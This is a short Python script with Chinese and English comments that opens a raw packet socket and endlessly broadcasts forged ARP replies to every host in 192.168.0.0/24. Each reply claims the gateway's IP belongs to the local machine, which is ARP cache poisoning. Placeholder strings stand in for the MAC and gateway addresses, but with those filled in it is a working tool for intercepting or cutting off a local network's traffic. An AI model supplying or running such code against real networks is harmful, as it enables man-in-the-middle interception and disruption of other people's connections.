import socket
from struct import pack
from binascii import unhexlify
from ipaddress import ip_network
x=ip_network('192.168.0.0/24',strict=True)
y=[str(k) for k in x]
s=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))
"""
if_ether.h
#define ETH_P_ALL 0x0003 /* Every packet (be careful!!!) */
socket.htons
将16位正整数从主机字节序转化为网络字节序.
"""
s.bind(("wlp3s0",socket.htons(0x0003)))
a=pack('!6s6sH',
       unhexlify('ffffffffffff'),
       unhexlify('Local Ethernet Address'),
       0x0806)
"""
48.bit Ethernet address of destination 
48.bit Ethernet address of sender
16.bit protocol type = ether_type
The assign Ethernet type for ARP traffic is 0x0806
"""
while True:
    for w in y:
        b=pack('!HHBBH6s4s6s4s',1,0x0800,6,4,2,
               unhexlify('Local Ethernet Address'),
               socket.inet_aton('GateWay IPv4 Address'),
               unhexlify('ffffffffffff'),
               socket.inet_aton(w))
        """        
        hardware type:Ethernet (0x0001)
        Protocol type: IP(0x0800)
        0x0800 IP(v4),Internet Protocol version 4
        48.bit Ethernet address
        Addresses are fixed length of four octets(32 bit)
        16.bit opcode $REPLY=2
        nbytes hardware address of sender of this
        packet.
        mbytes protocol address of sender of this
        packet
        nbytes hardware address of target of this 
        packet
        mbytes protocol address of target
        """
        c=a+b
        s.send(c)
"""
将一个IPv4地址从以点号分为四段的字符串格式转化为32位的紧凑二进制格式.
unhexlify返回由十六进制字符串表示的二进制数据.
"""
